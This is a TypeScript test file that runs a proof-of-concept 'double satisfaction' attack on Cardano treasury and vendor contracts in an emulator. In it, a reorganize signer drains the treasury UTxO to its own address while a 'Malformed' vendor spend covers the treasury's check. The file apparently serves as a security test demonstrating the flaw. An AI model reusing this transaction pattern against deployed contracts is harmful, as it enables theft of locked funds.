import { beforeEach, describe, test } from "bun:test";
import { Core, makeValue } from "@blaze-cardano/sdk";
import * as Data from "@blaze-cardano/data";
import { Emulator, EmulatorProvider } from "@blaze-cardano/emulator";
import { reorganize_key, Reorganizer, sampleTreasuryConfig, sampleVendorConfig, setupEmulator } from "../utilities.test";
import { loadTreasuryScript, loadVendorScript, unix_to_slot } from "../../shared";
import { sweep } from "../../treasury/sweep";
import {
  TreasuryConfiguration,
  TreasurySpendRedeemer,
  VendorConfiguration,
  VendorSpendRedeemer
} from "../../types/contracts";
import { Address, AssetId, Ed25519KeyHashHex, Script, Slot, toHex } from "@blaze-cardano/core";

(BigInt.prototype as any).toJSON = function() {
  return this.toString()
} 

describe("Re-organize multiple satisfaction attack", () => {
  let emulator: Emulator;
  let treasuryConfig: TreasuryConfiguration;
  let vendorConfig: VendorConfiguration
  let treasuryScript: Script;
  let vendorScript: Script;
  let treasuryScriptAddress: Address;
  let vendorScriptAddress: Address;
  let vendorInput: Core.TransactionUnspentOutput;
  let treasuryInput: Core.TransactionUnspentOutput;
  let secondTreasuryInput: Core.TransactionUnspentOutput;
  let treasuryRefInput: Core.TransactionUnspentOutput;
  let vendorRefInput: Core.TransactionUnspentOutput;
  let provider: EmulatorProvider;
  let registryInput: Core.TransactionUnspentOutput

  const printUtxosAtAddress = async (address:Address) => {
    console.log(JSON.stringify((await provider.getUnspentOutputs(address)).map(u => u.toCore()), null, 2))
  }

  beforeEach(async () => {
    emulator = await setupEmulator();
    treasuryConfig = await sampleTreasuryConfig(emulator);
    vendorConfig = await sampleVendorConfig(emulator);
    const treasury = loadTreasuryScript(Core.NetworkId.Testnet, treasuryConfig);
    const vendor = loadVendorScript(Core.NetworkId.Testnet, vendorConfig)
    treasuryScript = treasury.script.Script;
    vendorScript = vendor.script.Script;
    treasuryScriptAddress = treasury.scriptAddress;
    vendorScriptAddress = vendor.scriptAddress;


    
    treasuryInput = new Core.TransactionUnspentOutput(
      new Core.TransactionInput(Core.TransactionId("1".repeat(64)), 0n),
      new Core.TransactionOutput(treasuryScriptAddress, makeValue(500_000_000_000n)),
    );
    treasuryInput.output().setDatum(Core.Datum.newInlineData(Data.Void()));
    emulator.addUtxo(treasuryInput);
  
    vendorInput = new Core.TransactionUnspentOutput(
      new Core.TransactionInput(Core.TransactionId("1".repeat(64)), 4n),
      new Core.TransactionOutput(
        vendorScriptAddress,
        makeValue(500_000_000_000n),
      ),
    );
    vendorInput.output().setDatum(Core.Datum.newInlineData(Data.Void()));
    emulator.addUtxo(vendorInput);

    treasuryRefInput = emulator.lookupScript(treasury.script.Script);
    vendorRefInput = emulator.lookupScript(vendor.script.Script)
    provider = new EmulatorProvider(emulator);
    registryInput = await provider.getUnspentOutputByNFT(
      AssetId(treasuryConfig.registry_token + toHex(Buffer.from("REGISTRY"))),
    );
  });



  describe("The reorganizer", () => {
    test("can steal from the treasury through double satisfaction", async () => {
      await emulator.as(Reorganizer, async (blaze, addr) => {
        console.log('User utxos before attack:')
        printUtxosAtAddress(addr)
        await emulator.expectValidTransaction(
          blaze,
          blaze
            .newTransaction()
            // Reorganize
            .setValidUntil(Slot(Number(treasuryConfig.expiration / 1000n) - 1))
            .addReferenceInput(treasuryRefInput)
            .addRequiredSigner(Ed25519KeyHashHex(await reorganize_key(emulator)))
            .addInput(
                treasuryInput,
                Data.serialize(TreasurySpendRedeemer, "Reorganize"),
              )
            .payAssets(addr, treasuryInput.output().amount())
          
            // Malformed
            .addReferenceInput(registryInput)
            .addReferenceInput(vendorRefInput)
            .addInput(vendorInput, Data.serialize(VendorSpendRedeemer, "Malformed"))
            .lockAssets(treasuryScriptAddress, vendorInput.output().amount(), Data.Void())
        );
        console.log('User utxos after attack:')
        printUtxosAtAddress(addr)
      });
    });
  });
});


